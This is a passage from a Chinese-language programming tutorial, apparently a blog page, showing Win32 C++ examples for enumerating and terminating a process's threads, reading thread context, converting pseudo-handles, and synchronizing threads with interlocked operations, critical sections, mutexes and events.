class="line">Thread32First(hThreadSnap, &amp;te32);</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (te32.th32OwnerProcessID == dwPID)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;线程ID:%d\n&quot;</span>, te32.th32ThreadID);</span><br><span class="line"><span class="comment">//1. 打开线程，得到句柄</span></span><br><span class="line">HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);</span><br><span class="line"><span class="comment">//2. 暂停</span></span><br><span class="line"><span class="comment">//SuspendThread(hThread);</span></span><br><span class="line"><span class="comment">//ResumeThread(hThread);</span></span><br><span class="line">TerminateThread(hThread, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 显示相关信息</span></span><br><span class="line">&#125; <span class="keyword">while</span> (Thread32Next(hThreadSnap, &amp;te32));</span><br><span class="line">CloseHandle(hThreadSnap);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">ListProcessThreads(<span class="number">4068</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="理解伪句柄"><a href="#理解伪句柄" class="headerlink" title="理解伪句柄"></a>理解伪句柄</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">LPVOID lpThreadParameter</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1 得到句柄</span></span><br><span class="line">HANDLE hThread = (HANDLE)lpThreadParameter;</span><br><span class="line"><span class="comment">//2 获取创建时间</span></span><br><span class="line">FILETIME stcCreationTime, stcExitTime;</span><br><span class="line">FILETIME stcKernelTime, stcUserTime;</span><br><span class="line">GetThreadTimes(hThread, &amp;stcCreationTime,</span><br><span class="line">&amp;stcExitTime, &amp;stcKernelTime, &amp;stcUserTime);</span><br><span class="line">FILETIME fi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">SYSTEMTIME st = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="comment">//将标准时间转换为本地时间</span></span><br><span class="line">FileTimeToLocalFileTime(&amp;stcCreationTime, &amp;fi);</span><br><span class="line"><span class="comment">//将时间戳转为能够看懂的时间</span></span><br><span class="line">FileTimeToSystemTime(&amp;fi, &amp;st);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1 获取当前线程句柄</span></span><br><span class="line">HANDLE hThread = GetCurrentThread();</span><br><span class="line">HANDLE hProcess = GetCurrentProcess();</span><br><span class="line"><span class="comment">//2 获取当前线程的创建时间</span></span><br><span class="line">FILETIME stcCreationTime, stcExitTime;</span><br><span class="line">FILETIME stcKernelTime, stcUserTime;</span><br><span class="line">GetThreadTimes(hThread, &amp;stcCreationTime,</span><br><span class="line">&amp;stcExitTime, &amp;stcKernelTime, &amp;stcUserTime);</span><br><span class="line">FILETIME fi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">SYSTEMTIME st = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="comment">//将标准时间转换为本地时间</span></span><br><span class="line">FileTimeToLocalFileTime(&amp;stcCreationTime, &amp;fi);</span><br><span class="line"><span class="comment">//将时间戳转为能够看懂的时间</span></span><br><span class="line">FileTimeToSystemTime(&amp;fi, &amp;st);</span><br><span class="line">Sleep(<span class="number">10000</span>);</span><br><span class="line"><span class="comment">//2.X 将伪句柄变成一个真句柄</span></span><br><span class="line">HANDLE hThreadParent = <span class="number">0</span>;</span><br><span class="line">DuplicateHandle(</span><br><span class="line">GetCurrentProcess(), <span class="comment">// 拥有源句柄的进程句柄</span></span><br><span class="line">GetCurrentThread(),  <span class="comment">// 指定对象的现有句柄(伪句柄)</span></span><br><span class="line">GetCurrentProcess(), <span class="comment">// 拥有新对象句柄的进程句柄</span></span><br><span class="line">&amp;hThreadParent,      <span class="comment">// 用于保存新句柄</span></span><br><span class="line"><span class="number">0</span>,                   <span class="comment">// 安全访问级别</span></span><br><span class="line"><span class="literal">false</span>,               <span class="comment">// 是否可以被子进程继承</span></span><br><span class="line">DUPLICATE_SAME_ACCESS); <span class="comment">// 转换选项</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//3 创建一个子线程</span></span><br><span class="line">HANDLE hChildThread = CreateThread(</span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">//安全属性</span></span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">//栈大小</span></span><br><span class="line">ThreadProc,<span class="comment">//线程回调函数</span></span><br><span class="line">(LPVOID)hThreadParent,    <span class="comment">//会将此参数传递给回调函数</span></span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>          <span class="comment">//获取线程ID，每一个线程都有一个唯一标识，就是线程ID</span></span><br><span class="line">);</span><br><span class="line">WaitForSingleObject(hChildThread, <span class="number">-1</span>);</span><br><span class="line">CloseHandle(hChildThread); <span class="comment">//关闭句柄</span></span><br><span class="line">CloseHandle(hThreadParent);<span class="comment">//关闭句柄</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="获取线程环境"><a href="#获取线程环境" class="headerlink" title="获取线程环境"></a>获取线程环境</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="function">VOID <span class="title">ListProcessThreads</span><span class="params">(DWORD dwPID)</span> </span>&#123;</span><br><span class="line">HANDLE hThreadSnap = INVALID_HANDLE_VALUE;</span><br><span class="line">THREADENTRY32 te32;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建快照</span></span><br><span class="line">hThreadSnap =</span><br><span class="line">CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 设置输入参数，结构的大小</span></span><br><span class="line">te32.dwSize = <span class="keyword">sizeof</span>(THREADENTRY32);</span><br><span class="line"><span class="comment">// 开始获取信息</span></span><br><span class="line">Thread32First(hThreadSnap, &amp;te32);</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (te32.th32OwnerProcessID == dwPID)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;线程ID:%d\n&quot;</span>, te32.th32ThreadID);</span><br><span class="line"><span class="comment">//1. 打开线程，得到句柄</span></span><br><span class="line">HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);</span><br><span class="line"><span class="comment">//2. 暂停</span></span><br><span class="line"><span class="comment">//SuspendThread(hThread);</span></span><br><span class="line"><span class="comment">//3. 获取上下文</span></span><br><span class="line">CONTEXT context = &#123; CONTEXT_ALL &#125;;</span><br><span class="line">GetThreadContext(hThread, &amp;context); </span><br><span class="line"><span class="comment">//context.;</span></span><br><span class="line"><span class="comment">//SetThreadContext(hThread, &amp;context); //获取之后，可以修改</span></span><br><span class="line"></span><br><span class="line">ResumeThread(hThread);</span><br><span class="line"><span class="comment">//TerminateThread(hThread, 0);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 显示相关信息</span></span><br><span class="line">&#125; <span class="keyword">while</span> (Thread32Next(hThreadSnap, &amp;te32));</span><br><span class="line">CloseHandle(hThreadSnap);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">ListProcessThreads(<span class="number">25088</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="线程同步"><a href="#线程同步" class="headerlink" title="线程同步"></a>线程同步</h2><h3 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h3><p>1  线程同步是一个什么样的问题？？？</p><p>  如果你编写的是多线程程序，那么多个线程是并发执行，可以认为他们是同时在执行代码。但是线程和线程之间并非是完全的没有关系。很多时候会有以下两种关系：</p><p>  第一种情况，线程A的继续执行，要以线程B完成了某一个操作之后为前提。 这种需求称之为同步</p><p>  第二种情况，多个线程在争抢一个资源，比如：全局变量，可以是文件，可以是一个数据结构，可以是一个对象。 这种需求称之为同步互斥。</p><p>2  以下的这些机制怎么解决的这个问题？？各自又什么区别，分别用于什么样的场景呢？？？</p><p>a.  以下这些机制都能够比较方便的解决互斥问题。</p><h4 id="原子操作："><a href="#原子操作：" class="headerlink" title="原子操作："></a>原子操作：</h4><p>​        原子操作适合去解决共享资源是全局变量的互斥问题。</p><p>​        作用就是对于一个变量的基本算术运算保证是原子性的。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">long</span> g_n = <span class="number">0</span>;</span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadPro1</span><span class="params">(LPVOID lpThreadParameter)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">InterlockedIncrement(&amp;g_n);</span><br><span class="line"><span class="comment">//写入文件</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadPro2</span><span class="params">(LPVOID lpThreadParameter)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">InterlockedIncrement(&amp;g_n);</span><br><span class="line"><span class="comment">//读取文件</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">HANDLE hThread1 = <span class="number">0</span>, hThread2 = <span class="number">0</span>;</span><br><span class="line">hThread1 = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadPro1, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">hThread2 = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadPro2, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">WaitForSingleObject(hThread1, <span class="number">-1</span>);</span><br><span class="line">WaitForSingleObject(hThread2, <span class="number">-1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, g_n);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="临界区解决互斥问题："><a href="#临界区解决互斥问题：" class="headerlink" title="临界区解决互斥问题："></a>临界区解决互斥问题：</h4><p>​       被保护的代码（代码访问了共享资源）放置在</p><p>​        EnterCriticalSection</p><p>​        LeaveCriticalSection 之间即可</p><p>​        临界区具有线程所有权这个概念，必须进入临界区的线程，调用离开临界区，临界区才会被打开。假如加锁的线程崩溃了，其他线程就锁死了。</p><p>介绍另外3种机制前，先说两个重要概念</p><p>1：</p><p>激发态（有信号）  非激发态（没有信号）</p><p>WaitForSignaleObject(内核对象，时间)；函数的作用，当内核对象处于非激发态的时候，就阻塞住，内核对象处于激发态了，就立即返回。</p><p>2：WaitForSignaleObject的副作用，WaitForSignaleObject对于被等待的内核对象有副作用。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> g_n = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//定义临界区结构体</span></span><br><span class="line">CRITICAL_SECTION g_cs = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadPro1</span><span class="params">(LPVOID lpThreadParameter)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">EnterCriticalSection(&amp;g_cs);</span><br><span class="line">g_n++;</span><br><span class="line">LeaveCriticalSection(&amp;g_cs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadPro2</span><span class="params">(LPVOID lpThreadParameter)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">EnterCriticalSection(&amp;g_cs);</span><br><span class="line">g_n++;</span><br><span class="line">LeaveCriticalSection(&amp;g_cs);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">//初始化临界区对象</span></span><br><span class="line">InitializeCriticalSection(&amp;g_cs);</span><br><span class="line">HANDLE hThread1 = <span class="number">0</span>, hThread2 = <span class="number">0</span>;</span><br><span class="line">hThread1 = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadPro1, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">hThread2 = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadPro2, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">WaitForSingleObject(hThread1, <span class="number">-1</span>);</span><br><span class="line">WaitForSingleObject(hThread2, <span class="number">-1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, g_n);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>知道了以上两个概念后，我们看其他3个机制</p><h4 id="互斥体解决互斥问题："><a href="#互斥体解决互斥问题：" class="headerlink" title="互斥体解决互斥问题："></a>互斥体解决互斥问题：</h4><p>​       被保护的代码（代码访问了共享资源）放置在</p><p>​       WaitForSignalObject</p><p>​       ReleaseMutex</p><p>​       互斥体也具有线程所有权的概念，得到互斥体的线程，需要自己去释放互斥体。谁加锁，谁开锁。如果得到互斥体的线程崩溃了，互斥体会立即变为激发态。所有等待互斥体的线程中会立即有线程得到互斥体。不会造成死锁的问题。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> g_n = <span class="number">0</span>;</span><br><span class="line">HANDLE g_hMutex = <span class="number">0</span>;</span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadPro1</span><span class="params">(LPVOID lpThreadParameter)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">WaitForSingleObject(g_hMutex, <span class="number">-1</span>);</span><br><span class="line">g_n++;</span><br><span class="line">ReleaseMutex(g_hMutex);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadPro2</span><span class="params">(LPVOID lpThreadParameter)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">WaitForSingleObject(g_hMutex, <span class="number">-1</span>);</span><br><span class="line">g_n++;</span><br><span class="line">ReleaseMutex(g_hMutex);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">HANDLE hThread1 = <span class="number">0</span>, hThread2 = <span class="number">0</span>;</span><br><span class="line">g_hMutex = CreateMutex(</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">FALSE,<span class="comment">//创建的线程，是不是第一个拥有者</span></span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line">hThread1 = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadPro1, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">hThread2 = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadPro2, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">WaitForSingleObject(hThread1, <span class="number">-1</span>);</span><br><span class="line">WaitForSingleObject(hThread2, <span class="number">-1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, g_n);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="事件解决互斥问题："><a href="#事件解决互斥问题：" class="headerlink" title="事件解决互斥问题："></a>事件解决互斥问题：</h4><p>需要是自动模式的事件</p><p>​      被保护的代码（代码访问了共享资源）放置在</p><p>​      WaitForSignalObject</p><p>​       SetEvent</p><p>​      事件，没有线程所有权的概念，任何线程都可以释放事件。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> g_n = <span class="number">0</span>;</span><br><span class="line">HANDLE g_hEvent = <span class="number">0</span>;</span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadPro1</span><span class="params">(LPVOID lpThreadParameter)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">WaitForSingleObject(g_hEvent, <span class="number">-1</span>);</span><br><span class="line">g_n++;</span><br><span class="line">SetEvent(g_hEvent);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadPro2</span><span class="params">(LPVOID lpThreadParameter)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">WaitForSingleObject(g_hEvent, <span class="number">-1</span>);</span><br><span class="line">g_n++;</span><br><span class="line">SetEvent(g_hEvent);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">HANDLE hThread1 = <span class="number">0</span>, hThread2 = <span class="number">0</span>;</span><br><span class="line">g_hEvent = CreateEvent(</span><br><span class="line"><span class="literal">NULL</span>, <span class="comment">//安全属性</span></span><br><span class="line">FALSE,<span class="comment">//TRUE:手工重置   FALSE:自动重置</span></span><br><span class="line">TRUE, <span class="comment">//TRUE:初始为激发态，  FALSE:初始就是非激发态</span></span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line">hThread1 = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadPro1, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">hThread2 = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, ThreadPro2, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">WaitForSingleObject(hThread1, <span class="number">-1</span>);</span><br><span class="line">WaitForSingleObject(hThread2, <span class="number">-1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, g_n);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="事件决定顺序"><a href="#事件决定顺序" class="headerlink" title="事件决定顺序"></a>事件决定顺序</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line">HANDLE g_hEvent = <span class="number">0</span>;</span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">WifeProc</span><span class="params">(LPVOID lpThreadParameter)</span> </span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;下班了，开始做饭吧&quot;</span>);</span><br><span class="line">Sleep(<span class="number">1000</span>);</span><br><span class="line">SetEvent(g_hEvent);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">HusProc</span><span class="params">(LPVOID lpThreadParameter)</span> </span>&#123;</span><br><span 